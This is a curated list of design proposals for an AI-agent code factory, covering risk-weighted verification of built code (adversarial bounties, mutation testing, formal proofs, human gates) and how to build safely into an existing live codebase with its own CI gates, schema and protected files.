- **The Adversary Treasury — every load-bearing leaf must survive a funded bounty hunter** `big/rash` _(curated)_ — Instead of running a fixed test suite, high-risk leaves (auth, migrations, payments, promotion) are released into an arena where a dedicated red-team model is PAID — in token budget — to BREAK them. A leaf is graded 'proven' only when a funded adversary, explicitly incentivized to find the exploit, fails to. Confidence = how much the adversary spent trying and lost; the richer the bounty it survived, the higher its trust score. **Why better:** Current 'green' is the absence of a failing test the builder thought to write — it can't catch the bug nobody imagined. A funded adversary attacks the blast radius the builder is blind to, and confidence becomes a real economic quantity (survived-bounty), not a binary pass.
- **Trust is a number that decays — every leaf has a half-life, and blast radius grows under it** `big/reasonable` _(curated)_ — No leaf is ever permanently green. Each carries a confidence score that DECAYS over time, with every nearby change, and as new nodes stack on top of it. An auth leaf decays fast (short half-life, re-verifies constantly); a static icon decays glacially. A foundational leaf (schema, auth, shared type) that 30 nodes now depend on gets its verification RE-RUN at higher depth precisely because its blast radius GREW after it was first certified — even though the leaf itself never changed. Trust is a living field across the plan-tree, not a one-time stamp. **Why better:** Binary green-ness assumes a leaf proven once stays proven forever — but the blast-radius leaf is exactly the one a later change silently breaks, and a leaf's actual risk is a function of how much eventually leans on it, unknown when it was first built and cheap. Decay forces verification spend to track real risk over the artifact's whole life and re-verifies the load-bearing nodes when they BECOME load-bearing.
- **The Blast-Radius Detonator — inject the failure and measure how far the damage spreads** `big/rash` _(curated)_ — For each high-risk leaf, the factory doesn't just test that it works — it deliberately DETONATES it (corrupts the migration, drops the auth check, fails the payment webhook) and watches how far the damage cascades through the graphify graph. Verification depth is then auto-dialed to the MEASURED blast radius: a leaf whose failure cascades to 40 nodes earns 40x the verification rounds of one that fails in isolation. **Why better:** Today risk is guessed by category labels ('payments = scary'). Detonation MEASURES actual blast radius from the real dependency graph, calibrating depth to ground truth — and surfaces the innocent-looking leaf that secretly holds up half the tree.
- **Self-doubt as a first-class output — every leaf ships a confession** `small/reasonable` _(curated)_ — Each worker, on finishing a leaf, is forced to emit not just code+tests but a CONFESSION: 'here's what I'm least sure about, here's the input that would break me, here's the assumption I couldn't verify.' Confessions aggregate up the tree and the factory routes EXTRA verification precisely at the points the builders themselves flagged as shaky — turning model uncertainty into a routing signal instead of throwing it away. **Why better:** Right now the model's own well-calibrated unease ('I'm not sure this handles the empty case') is discarded the moment it emits passing code. Harvesting confessions targets verification at the builder's actual blind spots — far cheaper and sharper than uniform testing everywhere.
- **The Insurance Market — leaves are underwritten, premiums reveal hidden risk** `big/rash` _(curated)_ — Every leaf must be 'insured' before it can join the stitch: a separate underwriter model quotes a premium (in token budget) to back it, based on perceived risk. A leaf nobody will cheaply insure is, by definition, the dangerous one — and the factory spends verification until the premium drops to an acceptable floor. The market PRICES risk that no static classifier would catch, because pricing aggregates many models' fear. **Why better:** A hand-coded risk classifier only knows the categories its author imagined. An insurance market surfaces emergent, cross-cutting risk through price discovery — the leaf everyone refuses to underwrite is the one your uniform verification would have rubber-stamped.
- **Proof-carrying leaves — high-risk nodes must carry a machine-checkable proof, not just tests** `big/rash` _(curated)_ — For the truly load-bearing tiers (irreversible migrations, money movement, auth boundaries), passing tests is no longer sufficient evidence. The leaf must carry a formal property/invariant proof — 'no code path lets an unauthenticated request reach this row', 'this migration is reversible' — that a checker verifies mechanically. Trivial leaves never pay this cost; only the nodes whose failure is catastrophic must PROVE themselves, not merely test themselves. **Why better:** Tests sample a few inputs; a sampled test (receipt-file check, typeof) can sail past a real defect. A proof covers ALL inputs by construction — exactly the certainty a payments/migration leaf needs and a boilerplate leaf would be wasteful to demand.
- **The factory bets its own budget and keeps score — calibration becomes the real metric** `big/reasonable` _(curated)_ — Every time the factory declares a leaf 'proven at confidence 0.9' it WAGERS budget on that claim, logging pre-build risk class, self-confidence, and later stitch/integration outcome. When reality contradicts a high-confidence green (a bug escapes), the factory loses the bet and recalibrates its risk classifier against the miss. Over hundreds of runs it learns which leaf-types its own confidence over-trusts (cheap leaf that broke the build) and under-trusts (flagged-scary leaf that was fine), and auto-deepens verification exactly where its track record is worst — verification depth becomes empirical, not a hand-tuned heuristic. **Why better:** Today nothing closes the loop between 'I said green' and 'was it actually fine', so uniform verification can never learn. The decision-log substrate already captures per-node outcomes; a self-scoring wager makes confidence CALIBRATED rather than asserted — the factory earns the right to trust a leaf-type cheaply only after a proven track record and stays paranoid where it has been burned.
- **Adversarial mutation as the depth dial, applied only where it matters** `big/rash` _(curated)_ — For high-risk leaves, verification escalates beyond 'tests pass' to 'tests CATCH injected bugs' — the orchestrator mutates the just-built code (flip a comparison, drop a guard, swap a sign) and DEMANDS the leaf's tests go red. A leaf whose tests survive mutation is fake-green and gets kicked back as green-but-unproven. This gate runs ONLY on T-high / above-threshold nodes, never on boilerplate. **Why better:** Passing tests prove the test author's imagination, not correctness — the deepest hidden flaw in 'green = proven'. Mutation testing measures whether verification actually reaches the risk surface, but it's too expensive everywhere; gating it by blast-radius class makes 'proven green' mean something specifically where a silent payments/auth bug would be lethal.
- **A leaf can refuse to be green and pull its own human gate — the per-leaf andon cord** `small/reasonable` _(curated)_ — Give leaves an 'I cannot self-certify' verdict distinct from pass/fail, and give every worker the authority to pull an andon: if while building it discovers the node touches auth, money, migrations, or PII, it HALTS its own completion and escalates that leaf to a deeper verification track (extra rounds + human gate) even if its tests are green. The line stops on that subtree until the deeper track clears — risk classification becomes continuous and worker-driven, not a one-time top-down label. **Why better:** Toyota's insight: the operator at the station sees defects the planner never classified up front. A worker that realizes mid-build it's writing a payments path currently has no way to demand more scrutiny, and a zero-human run will ship the irreversible migration on integration tests alone. The andon preserves the autonomous-swarm ideal for the 95% while refusing to let the orchestrator silently auto-approve the 5% that can't be undone.
- **Risk-weighted N-version programming — build the dangerous leaves twice, independently, and differential-test** `big/rash` _(curated)_ — For the small set of highest-risk leaves (auth, migrations, payments), have BOTH Claude and Codex independently build the leaf from the same frozen contract, in separate worktrees, with no sight of each other. Differential-test the two implementations against each other; divergence on any input is a defect that escalates. Trivial leaves are built once. **Why better:** Avionics doesn't single-source flight-critical code — it builds redundant versions and cross-checks them, because the cost of a silent bug dwarfs the duplicate build. The factory already has two models idle-capable; using them as independent IMPLEMENTERS (not just builder+reviewer) on the riskiest 5% turns cross-model review from opinion into an executable differential oracle.
- **Continuous canary verification after stitch — risk-weighted runtime monitors, not just build-time gates** `big/rash` _(curated)_ — Verification doesn't end at green. High-risk subtrees get auto-generated runtime assertions / contract monitors that ride along into the stitched artifact and self-check on first real execution (a canary run), reporting back to the cockpit. A migration leaf verifies its invariants against actual data shape post-stitch; a boilerplate leaf gets nothing. **Why better:** Build-time green can't catch integration drift the tests didn't model — canary/progressive delivery exists precisely because pre-prod tests under-cover blast radius. Extending the risk dial past the build boundary keeps the load-bearing nodes proving themselves where it counts, while trivial ones aren't burdened with monitors.
- **Defect-density priors that re-weight risk from history** `small/reasonable` _(curated)_ — Keep a ledger of which node-types and which skills historically produced kicked-back or post-stitch-failed leaves (auth always needs 3 rounds, icon leaves never fail). Feed that prior into the risk classifier so verification depth is LEARNED from the factory's own track record, not a static rule table — the way VFX supervisors triage shots by historical pain and eng orgs target review at known hotspot files. **Why better:** Static risk labels (auth=high) are a guess that never improves. A defect-density prior lets the dial self-correct — automatically deepening verification on whatever node-types THIS factory keeps getting wrong, and relaxing it on the ones it reliably one-shots.
- **Delete the confidence score — risk is a property of the CONTRACT, baked in at freeze, with no second oracle** `big/reasonable` _(curated)_ — There should be no per-leaf confidence number at all. The moment a contract is frozen top-down (typed signature + schema + failing tests + golden template), verification depth is fully determined by WHAT the contract touches — auth, money, migrations, PII — so classify risk ONCE and bake the required verification rounds INTO the contract itself. A built leaf is then either contract-satisfied or not. A separate confidence classifier riding on the finished artifact is a redundant second oracle that can only disagree with the contract and manufacture a 'green but unsure' ambiguity. **Why better:** Moves the risk decision UP to where information is richest (the architect freezing the contract) instead of DOWN to a post-hoc guess on output. Eliminates an entire 'green but unsure' state by making depth a typed field of the contract — one source of truth instead of two that drift and contradict.
- **Invert it: don't grade the leaf, grade the REVIEWER's surprise** `small/rash` _(curated)_ — Confidence shouldn't be attached to the built leaf — it should be attached to the cross-model reviewer's reaction. If Codex reviews a Claude-built leaf and has zero diffs, zero questions, zero 'huh', THAT is the confidence signal. Replace the per-leaf confidence field with a single boolean: 'did the cross-model pass produce any surprise?' Surprise routes to deeper verification; calm passes through. **Why better:** A score on a leaf is a model grading its own homework. Surprise is a real, observable, cross-model signal already generated for free during the review pass — cheaper, harder to game, and naturally risk-weighted because load-bearing leaves provoke more reviewer surprise than boilerplate.
- **Kill graded trust — make EVERY leaf prove itself, by spawning fewer, fatter leaves** `big/rash` _(curated)_ — Refuse the premise that any leaf is cheap. If a 'boilerplate' leaf can't carry a property test, it's not a leaf — it's noise that shouldn't have been spawned. Make full verification the FLOOR for every node, and attack the cost problem by raising the leaf-admission bar so the tree spawns fewer, fatter leaves. No confidence dial, just a higher bar to becoming a leaf at all. **Why better:** The wastefulness the aspect complains about ('uniform verification on trivial leaves') is really a symptom of over-decomposition. Rather than build a risk classifier to under-verify cheap leaves, raise the admission bar so cheap leaves never exist — verification stays uniform AND cheap because there's less of it.
- **Merge risk-weighting into the altitude dial — they're the same knob** `small/reasonable` _(curated)_ — Per-leaf risk-weighting is a duplicate of the ALTITUDE DIAL viewed from the bottom. Altitude already classifies scope (T0 component → T3 app) and gates spend before the swarm runs. Verification depth should be a deterministic function of altitude tier + a static 'sensitive surface' tag, not a new independent subsystem. Fold the whole risk-classifier idea into the altitude classifier that already exists and the user already sees in the cockpit. **Why better:** Two classifiers that both estimate 'how much does this node matter' will drift and contradict. One dial, extended with a sensitivity tag, is simpler to reason about and removes a whole speculative confidence-scoring layer.
- **No 'green-but-unsure' state — unsure means RED, full stop** `small/reasonable` _(curated)_ — The proposed third state launders uncertainty into shippable-looking output. Delete it. A leaf is green only when proven; everything else is red and blocks the green wave. If a leaf can't be proven green, the fix is a better contract or a human gate — not a yellow flag everyone learns to ignore. Binary green is a FEATURE: it forces the uncertainty to be resolved instead of displayed. **Why better:** A graded-trust UI teaches operators to ship amber. The whole value of 'the green wave climbs the tree' is that green is a hard guarantee — a soft-green dilutes the one signal the cockpit exists to convey. Strict binary keeps the wave meaningful.
- **Verification depth = a deterministic graph query on blast radius, computed automatically (Test Impact Analysis / Bazel)** `big/reasonable` _(curated)_ — Don't ask any model to estimate a leaf's risk. graphify already holds the dependency graph — compute blast radius MECHANICALLY before the swarm runs: how many downstream nodes import or are typed against this leaf, plus sensitive-edge tags (touches schema, on an auth/payment path). Verification depth is a pure function of that topology: a leaf 40 nodes depend on auto-earns property tests + a second cross-model reviewer + a human gate; a leaf nobody depends on gets a single smoke check. The dial is computed and explainable ('verified hard because 14 nodes depend on it and it writes to auth'), not guessed — the same graphify substrate workers query for code is reused as the unfakeable risk oracle. **Why better:** Google/Bazel learned test cost should track change impact, not be uniform; today every leaf gets identical review regardless of whether it's a load-bearing schema or a throwaway button. Replacing a subjective, gameable per-leaf score with an objective structural fact spends review budget exactly where failure propagates furthest — with no new subsystem and no second oracle to drift.
- **Stop verifying leaves entirely — confidence is a property of the EDGE, verify only the stitch seams** `big/rash` _(curated)_ — Per-leaf verification (and any per-leaf confidence) may be the wrong granularity. A leaf that passes its failing-test contract in isolation tells you little; almost all real defects live at the SEAMS where leaves meet. Spend the entire verification budget on integration boundaries during the mechanical stitch, and let leaf-level checking stay the cheap compiler/test pass it already is. Confidence is a property of an EDGE, not a NODE. **Why better:** Concentrates scarce verification where blast radius actually concentrates — the joins — instead of spreading it thin across every node with a risk dial. The contract already proved the leaf in isolation; double-paying for per-leaf confidence is redundant when the seam is where trust is won or lost.
- **Replace the score with a tripwire — verify nothing extra until reality disagrees with the contract** `small/rash` _(curated)_ — Don't pre-classify risk or pre-deepen verification at all. Build everything at baseline, ship behind the as-built graphify check, and let the contract-vs-reality diff be the ONLY thing that escalates. If as-built matches the frozen contract, trust it; if graphify finds drift, THAT node retroactively earns deep verification. Confidence is computed lazily, on disagreement, never eagerly per leaf. **Why better:** Eager per-leaf risk scoring spends verification budget on leaves that turn out fine. A tripwire spends nothing until there's concrete evidence of a problem (graph drift), making verification reactive and self-targeting. The 'does reality match the contract graph' check is already in the design — this makes it the sole escalation trigger and deletes the speculative scorer.

### Brownfield integration — building INTO a live system, not greenfield

_Current assumption: The whole pipeline implicitly assumes a GREENFIELD artifact: decompose intent, freeze contracts, build from scratch, stitch. Unstated: the headline use case (a feature/floor for The Tower) is BROWNFIELD — the factory must build into a large existing codebase with its own contracts, conventions, RLS patterns, the Drizzle-not-on-Vercel gotcha, existing tables it must not break, and CI gates. The factory needs to INGEST and respect the existing graph as immovable constraints, not just generate a fresh contract tree. 'graphify' is framed as the shared map of the NEW build, not as the discovery of the EXISTING system's contracts the build must conform to._

**Boldest reframe:** The anti-factory / graft surgeon: invert which use case is primary. The product is NOT a factory (raw materials in, product out) but a TRANSPLANT SURGEON operating on a living patient — host-tissue typing, rejection prevention, minimal-incision, post-op monitoring. The greenfield "factory" is the rare special case (the interior of a genuinely new subtree); the dominant real workload — a new floor for the live Tower under hard CI/RLS/legal/byte-protection constraints — is surgery. Inverting which metaphor is primary re-optimizes every subsystem (contracts, graphify, gates, orchestration) for safe insertion into a living system instead of pristine from-scratch generation that almost never matches the actual task.

- **Ingest the live repo AS the contract tree (reverse-graphify) — discover, don't author** `big/reasonable` _(curated)_ — The factory's FIRST act in brownfield is to parse the live system into the SAME plan-tree datastructure it would otherwise generate: every pgTable becomes a frozen read-only leaf-contract, every *-rest.ts module a frozen interface node, every CI workflow a constraint edge, the 41 migrations a sequential constraint chain. New intent attaches as a SUBTREE onto pre-existing immovable nodes rather than as a standalone forest. graphify becomes a PAIR — graphify-discover (AS-IS graph) and graphify-plan (TO-BE graph) — and the build is defined as the minimal conflict-free DELTA that morphs AS-IS into TO-BE; verification is graph-equality between TO-BE and post-build reality. The factory literally cannot regenerate what it should reuse. Authoring fresh contracts is the rare exception, only for genuinely new tables/modules. **Why better:** The greenfield assumption freezes a FRESH contract tree from intent and hopes it matches; in a live app the schema/conventions are UPSTREAM of intent and you conform to them. Modeling AS-IS + TO-BE and shipping only the delta eliminates the entire class of failures where the swarm invents a parallel schema or query convention that collides with the 31 existing tables and the REST-not-Drizzle rule — the existing system enters the pipeline as data, not as an afterthought to reconcile.
- **Constraints-as-failing-tests harvested from the codebase (the Living Constitution)** `big/reasonable` _(curated)_ — Before any worker builds, a one-time deep crawl distills the existing repo into an EXECUTABLE constitution — not prose docs but a runnable rule-engine of machine-checkable invariants auto-synthesized from existing test files, the 8 CI workflows, and CLAUDE.md gotchas: 'no runtime Drizzle db in src/app server code', 'every new table has auth.uid()=user_id RLS', 'no console.log/TODO in shipped code', 'GSAP only via @/lib/gsap-init', 'companies queries emit employee_count as null', 'no LAUNCH_CONFIG reintroduction'. Each becomes a pre-existing RED bar the worker must keep green, fed UPFRONT alongside its own feature-spec tests — distinct halves of one failing-test layer. A violation is a compile error, not a review comment. **Why better:** Contracts ARE failing tests in this pipeline — but currently only the new feature's. Brownfield's test suite is the encoded law of the land. Turning conventions into hard executable invariants fed upfront makes the green wave structurally unable to climb past a violation it was never told about, instead of probabilistically hoping prompted workers respect prose conventions that only surface late at lint/build or never.
- **Immovability tiers: a node-level mutability classifier as a first-class scope dimension** `small/reasonable` _(curated)_ — Every existing node a build touches is auto-classified into a tier: SACRED (byte-protected Otis/CEO art, lobby backgrounds, legal-config, RLS macro, irreversible migrations — never touch, hard-fail any diff), STABLE (existing tables/columns — extend-only, additive migrations), MALLEABLE (UI components — refactor freely), GREENFIELD (genuinely new files). The orchestrator routes worker permissions and edit capabilities off this tier; immovability sits alongside the altitude dial as a core scope axis. Brownfield building is defined less by what you make than by what you are physically forbidden to disturb. **Why better:** The factory treats all code as buildable because greenfield has no sacred ground. This repo has explicit byte-protected assets and CODEOWNERS-gated files CI will hard-fail on. Encoding protected zones as tiers means the swarm physically cannot spend tokens generating a diff CI will reject anyway — failure moves left, before the spend, not after.
- **Dock-point / .BUILD seam registry: generalize ArtLab's slot-registry from art to code, with Bazel-style visibility** `big/reasonable` _(curated)_ — Lift the proven ARTLAB_SLOT_REGISTRY + manifest-slot-check pattern (already fails-closed when a generated asset doesn't match a registered slot's appPath/kind) into a CODE seam registry, hardened with Bazel's per-package visibility. Each existing floor/module ships a checked-in factory.build declaring its public surface (which tables, RPCs, route handlers, components others may call) and an allow/deny list. A new feature resolves each leaf to a registered dock-point — a floor's page.tsx server-fetch, a <Floor>Client.tsx, the FLOORS array in src/types/ui.ts, a *-rest.ts module, the sitemap/PUBLIC_PATHS pair — and the factory REFUSES to stitch a leaf with no valid seam, and physically cannot reference anything outside another node's visibility list. **Why better:** There is already a working brownfield-conformance mechanism in THIS repo for art that just isn't applied to code. Bazel's insight is the EXISTING graph must publish its own enforceable boundaries. A worker physically cannot break the Drizzle-on-Vercel rule or touch a protected table if those nodes deny it, turning 'where does this new code attach' into a typed compile-time-enforced contract rather than something a worker guesses by remembering CLAUDE.md.
- **Convention-mining: derive the golden template FROM the nearest siblings, not a per-stack ideal** `small/reasonable` _(curated)_ — Instead of one generic per-stack golden template, for each leaf the discovery pass finds the most similar EXISTING artifacts and extracts the de-facto local pattern as a node-local template the worker must match: a new floor diffs the 8 existing floors (page.tsx + <Floor>Client.tsx + floor-N/ + FLOORS entry + sitemap); a new query samples 5 of the ~39 *-rest.ts modules (header-comment gotcha note, Row<> type import, camelCase-for-agent dual shape, RLS third-arg array); a new agent clones the createAgentRouteHandler template. It can also read git history to infer UNWRITTEN contracts (why timestamps are always withTimezone, why every floor has FloorShell). The factory keeps a curated set of EXEMPLAR 'hero assets' (one canonical RLS table, one createAgentRouteHandler route, one Supabase-REST fetch) and grades every new leaf against its exemplar the way VFX grades every shot against the hero. **Why better:** A golden per-stack template is greenfield thinking — it encodes how the stack is 'supposed' to look. This repo has its OWN golden templates living in 8 parallel floors and ~39 query modules. Mining the actual nearest sibling produces code indistinguishable from hand-written Tower code on the first shot — in brownfield, correctness INCLUDES conformity, and the golden template is emergent and local, not prescribed and global.
- **Conformance gate = the repo's REAL CI pulled INTO the plan-tree as terminal sensor nodes** `small/reasonable` _(curated)_ — The factory's verification doesn't invent its own checks — it ingests the repo's 8 existing CI workflows (config-guard, artlab-byte-diff, hardening-e2e, canary, plus tsc --noEmit, lint, vitest ~2285 tests, build, the LAUNCH_CONFIG grep, the tower-ship-gate skill) as first-class terminal gate-NODES wired into the plan-tree, the way Airflow/Inngest model external systems as wait-for sensors. The green wave literally cannot complete until the SAME checks a human PR must pass go green locally. A leaf can't join the wave until it clears the same bar. **Why better:** graphify is currently framed as verifying reality matches the NEW contract, and CI is an after-the-fact wall the finished artifact hits. The real definition-of-done already exists in this repo. Pulling the gates into the DAG means the factory optimizes for passing the REAL existing gates from the first leaf, holding output to the live system's bar by construction instead of bouncing a beautiful artifact off CI.
- **Blast-radius gate replaces (or precedes) the scope-preview gate; human oversight = risk, not size** `big/reasonable` _(curated)_ — Before the swarm spends, the cheap preview shows not just NEW scope but BLAST RADIUS: which of the 31 tables, 8 agents, 17 cron families, CI gates, and CODEOWNERS paths the build could touch or risk, ranked by immovability. The human gate approves a RISK SURFACE ('this touches the applications table and trips config-guard'), not a feature size. Each leaf additionally ships with a proof of what it CANNOT break: its failing-test contract must include NEGATIVE tests proving untouched surfaces stay byte-identical (the migration adds a column but every existing RLS policy and *-rest query still passes). Google-style characterization/approval tests auto-pin current behavior of every existing node the build touches into the same green wave. Green means 'built the new thing AND proved I broke nothing.' **Why better:** In greenfield the only cost is build effort and nothing pre-exists to endanger, so size is the right gate. In a live revenue system the owner cares far more that a feature might silently alter the offers table or trip the legal-config CODEOWNERS gate than that it's 'a T2 build.' Making non-interference a first-class testable contract turns brownfield's real risk — silent collateral damage — from an afterthought into the unit of oversight.
- **Drift sentinel: re-discover the graph mid-run because the factory itself mutates it** `small/reasonable` _(curated)_ — Because the factory spawns many parallel workers in worktrees that all merge back, it periodically re-runs the discovery pass DURING a long run to catch when one worker has already added a new table, a new *-rest.ts module, or a new FLOORS entry — and feeds that delta to sibling workers so they conform to in-flight changes, not just the pre-run snapshot. The system-under-construction is treated as a moving brownfield. **Why better:** A one-time ingest assumes the existing graph is static during the build, but the factory mutates the graph as workers land code, so parallel siblings collide (two new tables, two FLOORS edits). Re-discovery eliminates a class of merge-time stitch conflicts the green-wave can't mechanically resolve.
- **Anti-corruption-layer / Strangler-Fig node type: build adapters in fresh files, touch the live graph through one auditable seam** `big/rash` _(curated)_ — From DDD's anti-corruption layer + Strangler Fig: bias the factory toward building NEW code behind a thin adapter that conforms to the existing system's contracts, rather than editing existing files in place. A first-class ACL/seam node type wraps legacy surfaces so the parallel swarm works in fresh, low-conflict files and only a tiny, reviewable seam touches the live graph. Integration becomes the default shape, not an afterthought. **Why better:** The greenfield assumption is 'build from scratch and stitch'; brownfield reality is mostly 'integrate at a seam.' Strangler Fig makes parallel workers in worktrees rarely collide — they write new adapter nodes — and the immovable existing graph is touched through one auditable boundary instead of N scattered edits, which is exactly what lets the autonomous swarm run wide without corrupting live tissue.
- **The surgeon node: every live-state mutation ships anesthesia, backfill, rollback, flag, and saga compensation BEFORE the cut** `big/rash` _(curated)_ — When the plan-tree touches schema or live state, a dedicated 'surgeon' node treats it as live-system surgery: it generates the forward migration, the reverse migration, a backfill plan for existing rows, a feature-flag to dark-ship, and a canary-staged rollout — ALL before the feature code is written, frozen as part of the contract. Borrowing Temporal/saga compensation, any node that mutates live state (migration, new RLS policy, cron registration) declares a compensating undo at freeze time; if a downstream node fails the green wave, the orchestrator runs compensations in reverse to restore the brownfield system to its exact pre-run state — no half-applied migration across the 41-migration chain, no orphaned policy. No schema-touching leaf builds until its full surgical kit (including rollback) is green against the twin. **Why better:** The greenfield flow freezes contracts then builds and never models that existing rows and live traffic exist during the change; a failed run can leave the real database half-mutated. Making rollback + backfill + flag + compensation part of the FROZEN contract (not cleanup) makes brownfield builds transactional and treats the live system's continuity as sacred from the first move.
- **Ghost-merge: rehearse against a perfect digital twin of prod before touching reality** `big/rash` _(curated)_ — The factory forks a live shadow of The Tower — real schema, real RLS, real CI, seeded real-shaped data, even a stubbed Vercel-serverless+IPv6 environment that reproduces the 'Tenant not found' / pooler failure mode — and builds the feature INTO the twin first. Only a green twin (build + tests + e2e + canary all pass against the brownfield) earns a stitch into the real tree. The twin is regenerated per run from the live graph so it never drifts. **Why better:** Greenfield stitch assumes the new artifact slots cleanly into empty space; brownfield breakage is INTEGRATION breakage that only shows up against the real existing system. Rehearsing in a faithful twin catches the breaks that unit-green leaves invisible — including the repo's own IPv6/pooler trap — before they hit production.
- **Probe the RUNNING system, not just the source — the factory is an empiricist** `big/rash` _(curated)_ — The discovery phase doesn't stop at static source. It runs LIVE probes to learn contracts source alone can't reveal: hit the Supabase REST endpoint to confirm actual columns (catching the 'employee_count doesn't exist but is read as null' trap), run the existing test suite to get the true green baseline, parse runtime logs/Sentry for the real error surface. These observed facts become immovable constraint nodes. The authoritative spec of a brownfield system is the running instance, which drifts from source. **Why better:** Discovery assumes source is ground truth, but brownfield's ground truth is deployed reality, which drifts. Observing what the live system actually does — not what the code claims — catches the exact failure modes this codebase already hand-worked-around (type-only placeholder columns, the IPv6/pooler DB-access trap) before the swarm builds against a phantom schema.
- **Self-extending constitution: every surviving run teaches the factory a new Tower rule** `small/rash` _(curated)_ — Every run that survives the twin, the gates, and the prod canary writes back what it LEARNED about The Tower's contracts — a new idiom, a newly discovered gotcha, a convention it had to obey — into the living constitution. The factory's model of the existing system sharpens with every feature shipped, so the 100th floor is built with a richer, hard-won map than the 1st, and discovery cost trends toward zero. **Why better:** The current model re-discovers or re-prompts the existing system every run and never compounds. Brownfield knowledge is the most expensive thing to acquire and the most reusable. A factory that accretes its host system's contracts over time turns one-time archaeology into a permanently growing, ever-more-accurate map.
- **The anti-factory: invert the metaphor — it's a graft surgeon, greenfield is the special case** `big/rash` _(curated)_ — Reframe the whole product for brownfield: it is not a factory (raw materials in, product out) but a TRANSPLANT SURGEON operating on a living patient. Core competencies become host-tissue typing (read existing contracts), rejection prevention (invariant preservation), minimal-incision (smallest viable diff), and post-op monitoring (does the live system still pass its own tests/canary after the graft). The 'factory' framing governs only the genuinely greenfield interior of a new subtree. Invert which use case is primary: the dominant real workload — a floor for an existing Tower — is surgery, and the from-scratch factory is the edge case. **Why better:** The headline demo (build an app from scratch) is greenfield and the metaphor was generalized from the demo for narrative impressiveness, not the dominant real task. Re-centering on the actual highest-frequency job — extending a large live codebase under hard CI/RLS/legal constraints — makes every design decision optimize for safe insertion instead of pristine from-scratch generation that almost never matches reality.
- **Immune system, not gate: protected surfaces emit active antibodies at design-time** `big/rash` _(curated)_ — Instead of CI gates that reject at the end, a one-time pass tags protected regions as 'self' (byte-protected Otis/CEO art, lobby backgrounds, legal-config CODEOWNERS files, irreversible migrations, the LAUNCH_CONFIG ban, the 31 RLS tables, the FloorShell contract). The moment the plan-tree even PROPOSES touching a protected surface, that surface emits an active antibody worker: a 'self' edit auto-rejects and quarantines the diff before review/stitch, while a STABLE surface negotiates with the builder mid-flight ('you may extend applications but here is the exact RLS clause and *-rest accessor you must use'), steering the build instead of failing it after. **Why better:** Today's CI gates are reactive — they punish a finished violation late, when it's expensive. The biological self/non-self model makes the constraint arrive at design-time when it's cheap to honor, turning gates from graveyards into guardrails so a swarm of wide-open autonomous processes can run without a single one corrupting protected brownfield tissue.
- **Propose-only: the factory is structurally incapable of mutating main or the live schema** `small/reasonable` _(curated)_ — Invert 'build INTO a live system.' The factory's terminal output for any brownfield target is never a merged change — it's a fully-built, self-contained branch/PR that a human or a single review agent integrates. The factory cannot touch main or the live schema directly; integration is explicitly someone else's small job. This mirrors the repo's existing push protection, CODEOWNERS gates, byte-protected assets, and ArtLab's own 'drafts branches only, never opens PRs' rule. **Why better:** The riskiest claim in the pipeline is 'autonomous parallel build INTO a large existing codebase with CI gates it must not break.' Propose-only keeps autonomy where it's safe (building) and removes it where it's catastrophic (mutating live contracts), matching exactly what this codebase already enforces everywhere else.
- **Greenfield-only across a hard boundary: delete brownfield integration entirely** `big/rash` _(curated)_ — Delete brownfield integration as a goal. The factory only ever builds standalone, fully-owned artifacts that talk to the existing Tower across a clean network/module boundary (a new route group, package, or service) — never editing live files, never touching schema.ts, RLS, or the ~80 existing routes. 'Integration' degrades to 'one human wires the seam in 10 minutes.' **Why better:** The current assumption forces the factory to ingest and model the entire 216k-LOC graph as immovable constraints — the hardest, most failure-prone subsystem. If the factory emits only isolated, append-only artifacts behind a clean boundary, the brownfield problem evaporates: no contract-conformance, no merge conflicts, no risk to the 31 live tables. You trade a small wiring cost for deleting the whole hardest subsystem.
- **Failure-driven discovery: ingest the CI gates, let RED reveal the contracts** `big/rash` _(curated)_ — Invert 'discover the existing contracts up front.' The factory knows NOTHING about the existing system's conventions. It builds optimistically, then runs the real CI gates (tsc, lint, vitest, config-guard, byte-diff, the e2e harness) and treats every failure as the contract being revealed. The gates ARE the brownfield map; you learn them by violating them, not by modeling them. Don't build the queryable graph at all. **Why better:** Modeling a live system's implicit contracts into a 'graph the build must conform to' is an enormous, always-stale artifact that rots the moment someone merges a PR. The gates already encode the real constraints executably and stay current for free. Failure-driven discovery is cheaper to build and can never drift from reality.
- **Brownfield is the DEFAULT path — there is no separate greenfield mode** `big/reasonable` _(curated)_ — Flip the pipeline's polarity: assume the factory ALWAYS builds into a live system, and treat greenfield as a degenerate edge case (an empty existing graph). Kill the separate greenfield happy-path entirely; the plan-tree, contracts, and stitch are all defined as diffs against an existing graph from day one. Equivalently, fold brownfield into the contract layer: 'freeze contracts top-down' simply includes the existing system's frozen contracts as pre-existing immutable already-green leaves, so there is no distinct 'brownfield integration' subsystem to maintain — one freezing machine, and the green-wave stitch already knows how to stop at a leaf it didn't build. **Why better:** The current framing has a greenfield core with brownfield bolted on, so the most common real use case (a Tower floor) runs the least-tested path. If brownfield is the only path, contracts are always 'frozen relative to what exists' — what every actual run needs — and treating brownfield as its own subsystem stops duplicating everything the contract layer already does. One code path, exercised every time.
- **Incremental greenfield-and-swap: re-derive the touched slice clean and replace it, don't thread through legacy** `big/rash` _(curated)_ — Reverse 'conform to the existing system.' When the factory builds a new feature, it also re-derives the slice of the existing system it touches from scratch (fresh tables, fresh routes, fresh patterns) and proposes REPLACING the old slice rather than threading through it. The old slice's existing tests become the acceptance contract for the replacement. Brownfield becomes incremental greenfield-and-swap, not integration; the codebase quality ratchets UP over time. **Why better:** Conforming to legacy contracts you didn't choose is where AI builders are weakest and where 216k LOC of accumulated convention fights hardest. Re-deriving a clean slice plays to the factory's actual strength (one-shotting explicit greenfield leaves) and lets the codebase improve instead of accreting more layers that respect old mistakes — with the old tests guaranteeing behavior is preserved.
- **Serialize the swarm for brownfield — invert 'more processes = more power'** `small/reasonable` _(curated)_ — For brownfield targets, invert the orchestrator's core thesis. Parallel autonomous workers editing a shared live codebase maximize merge conflicts and contract violations against the 31 shared tables, shared schema.ts, and overlapping routes. The right move into a live system is a single serialized agent that edits, runs the gates, and only then proceeds — depth and order, not fan-out. Parallelism is a greenfield luxury that becomes a liability the moment the ground isn't empty. **Why better:** The 'more processes = more power' claim assumes independent leaves, which holds for greenfield but breaks the instant N workers touch the same tables, schema.ts, or routes. Serializing brownfield edits trades raw throughput for never producing an un-stitchable pile of conflicting diffs against a system with 8 CI gates.
